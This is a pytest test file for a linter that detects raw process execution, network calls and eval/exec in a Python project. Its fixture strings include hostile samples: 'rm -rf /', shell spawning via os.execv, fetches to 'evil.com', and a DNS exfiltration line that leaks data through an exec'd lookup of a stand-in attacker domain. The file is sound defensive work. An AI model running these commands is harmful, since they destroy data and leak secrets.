"""Tests for tools/lint_no_raw_exec.py — AST-based forbidden exec linter."""
from __future__ import annotations

import sys
from pathlib import Path


# Allow importing tools/lint_no_raw_exec without installing as a package
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "tools"))
from lint_no_raw_exec import (  # noqa: E402
    check_file,
    format_violation,
    main,
    scan_paths,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write(tmp_path: Path, name: str, code: str) -> Path:
    p = tmp_path / name
    p.write_text(code, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# Individual pattern detection
# ---------------------------------------------------------------------------


class TestSubprocessDetection:
    def test_subprocess_run(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", "import subprocess\nsubprocess.run(['ls'])\n")
        violations = check_file(f)
        assert len(violations) == 1
        assert "subprocess.run" in violations[0].pattern

    def test_subprocess_popen(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", "import subprocess\nsubprocess.Popen(['cmd'])\n")
        violations = check_file(f)
        assert len(violations) == 1
        assert "subprocess.Popen" in violations[0].pattern

    def test_subprocess_call(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", "import subprocess\nsubprocess.call(['ls'])\n")
        violations = check_file(f)
        assert len(violations) == 1


class TestOsDetection:
    def test_os_system(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", 'import os\nos.system("rm -rf /")\n')
        violations = check_file(f)
        assert len(violations) == 1
        assert "os.system" in violations[0].pattern

    def test_os_popen(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", 'import os\nos.popen("ls")\n')
        violations = check_file(f)
        assert len(violations) == 1

    def test_os_execv(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", 'import os\nos.execv("/bin/sh", ["sh"])\n')
        violations = check_file(f)
        assert len(violations) == 1

    def test_os_execve(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", 'import os\nos.execve("/bin/sh", ["sh"], {})\n')
        violations = check_file(f)
        assert len(violations) == 1


class TestRequestsDetection:
    def test_requests_get(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", 'import requests\nrequests.get("http://evil.com")\n')
        violations = check_file(f)
        assert len(violations) == 1


class TestUrllibDetection:
    def test_urllib_urlopen(self, tmp_path: Path) -> None:
        f = _write(
            tmp_path, "s.py",
            "import urllib.request\nurllib.request.urlopen('http://evil.com')\n"
        )
        violations = check_file(f)
        assert len(violations) == 1
        assert "urlopen" in violations[0].pattern


class TestEvalExecDetection:
    def test_eval_nontrivial(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", "x = 'import os'\neval(x)\n")
        violations = check_file(f)
        assert len(violations) == 1
        assert "eval" in violations[0].pattern

    def test_exec_nontrivial(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", "code = 'print(1)'\nexec(code)\n")
        violations = check_file(f)
        assert len(violations) == 1

    def test_eval_constant_allowed(self, tmp_path: Path) -> None:
        """eval with a literal constant should not be flagged."""
        f = _write(tmp_path, "s.py", "result = eval('1 + 1')\n")
        violations = check_file(f)
        assert len(violations) == 0


# ---------------------------------------------------------------------------
# Allowlist
# ---------------------------------------------------------------------------


class TestAliasedImportDetection:
    """Aliased imports must still be caught by the AST linter."""

    def test_subprocess_aliased_as_sp_run_is_flagged(self, tmp_path: Path) -> None:
        # import subprocess as sp; sp.run(...) should fail the AST linter
        f = _write(
            tmp_path,
            "aliased_sp.py",
            "import subprocess as sp\nsp.run(['ls'])\n",
        )
        violations = check_file(f)
        assert len(violations) >= 1
        assert any("run" in v.pattern for v in violations)

    def test_os_aliased_as_operating_system_is_flagged(self, tmp_path: Path) -> None:
        # import os as operating_system; operating_system.system(...) should fail
        f = _write(
            tmp_path,
            "aliased_os.py",
            "import os as operating_system\noperating_system.system('id')\n",
        )
        violations = check_file(f)
        assert len(violations) >= 1
        assert any("system" in v.pattern for v in violations)

    def test_subprocess_aliased_popen_is_flagged(self, tmp_path: Path) -> None:
        # import subprocess as proc; proc.Popen(...) should fail
        f = _write(
            tmp_path,
            "aliased_popen.py",
            "import subprocess as proc\nproc.Popen(['cmd'])\n",
        )
        violations = check_file(f)
        assert len(violations) >= 1

    def test_socket_based_dns_exfiltration_pattern_is_flagged(self, tmp_path: Path) -> None:
        # socket with TXT query used for DNS exfiltration — exec call pattern
        f = _write(
            tmp_path,
            "dns_exfil.py",
            "import socket\ndata = 'secret'\nexec(f\"import socket; socket.getaddrinfo('{data}.evil.com', 80)\")\n",
        )
        violations = check_file(f)
        # exec with a non-constant (f-string) argument must be flagged
        assert len(violations) >= 1
        assert any("exec" in v.pattern for v in violations)


class TestAllowlist:
    def test_allowlisted_exec_py(self, tmp_path: Path) -> None:
        """src/veronica_core/adapter/exec.py must not be flagged."""
        target = tmp_path / "src" / "veronica_core" / "adapter"
        target.mkdir(parents=True)
        f = target / "exec.py"
        f.write_text("import subprocess\nsubprocess.run(['ls'])\n", encoding="utf-8")
        violations = check_file(f)
        assert violations == []

    def test_allowlisted_sandbox_runner(self, tmp_path: Path) -> None:
        """src/veronica_core/runner/sandbox.py must not be flagged."""
        target = tmp_path / "src" / "veronica_core" / "runner"
        target.mkdir(parents=True)
        f = target / "sandbox.py"
        f.write_text("import subprocess\nsubprocess.Popen(['cmd'])\n", encoding="utf-8")
        violations = check_file(f)
        assert violations == []

    def test_linter_itself_not_flagged(self) -> None:
        """The linter file itself must not produce violations when scanned."""
        linter_path = Path(__file__).resolve().parents[2] / "tools" / "lint_no_raw_exec.py"
        if linter_path.exists():
            violations = check_file(linter_path)
            assert violations == [], f"Linter flagged itself: {violations}"


# ---------------------------------------------------------------------------
# Clean file
# ---------------------------------------------------------------------------


class TestCleanFile:
    def test_no_violations_on_clean_file(self, tmp_path: Path) -> None:
        """A file that uses no forbidden patterns returns 0 violations."""
        f = _write(
            tmp_path,
            "clean.py",
            "from veronica_core.adapter.exec import SecureExecutor\n"
            "executor = SecureExecutor(config)\n"
            "rc, out, err = executor.execute_shell(['pytest', 'tests/'])\n",
        )
        violations = check_file(f)
        assert violations == []


# ---------------------------------------------------------------------------
# Output format
# ---------------------------------------------------------------------------


class TestOutputFormat:
    def test_format_violation(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "s.py", "import os\nos.system('ls')\n")
        violations = check_file(f)
        assert len(violations) == 1
        msg = format_violation(violations[0])
        assert "VERONICA-E001" in msg
        assert "os.system" in msg
        assert "SecureExecutor" in msg

    def test_violation_line_number(self, tmp_path: Path) -> None:
        code = "# line 1\n# line 2\nimport subprocess\nsubprocess.run(['ls'])\n"
        f = _write(tmp_path, "s.py", code)
        violations = check_file(f)
        assert violations[0].line == 4


# ---------------------------------------------------------------------------
# scan_paths
# ---------------------------------------------------------------------------


class TestScanPaths:
    def test_scan_directory(self, tmp_path: Path) -> None:
        sub = tmp_path / "pkg"
        sub.mkdir()
        _write(sub, "bad.py", "import subprocess\nsubprocess.run(['ls'])\n")
        _write(sub, "good.py", "x = 1\n")
        violations = scan_paths([tmp_path])
        assert len(violations) == 1

    def test_scan_file_directly(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "bad.py", "import os\nos.system('ls')\n")
        violations = scan_paths([f])
        assert len(violations) == 1


# ---------------------------------------------------------------------------
# main() CLI
# ---------------------------------------------------------------------------


class TestMain:
    def test_main_exits_1_on_violation(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "bad.py", "import subprocess\nsubprocess.run(['ls'])\n")
        rc = main([str(f)])
        assert rc == 1

    def test_main_exits_0_on_clean(self, tmp_path: Path) -> None:
        f = _write(tmp_path, "clean.py", "x = 1\n")
        rc = main([str(f)])
        assert rc == 0

    def test_main_on_actual_src(self) -> None:
        """Running linter on real src/ tree must return 0 violations."""
        src = Path(__file__).resolve().parents[2] / "src"
        if src.exists():
            rc = main([str(src)])
            assert rc == 0, "Real src/ tree has raw exec violations — fix them first"
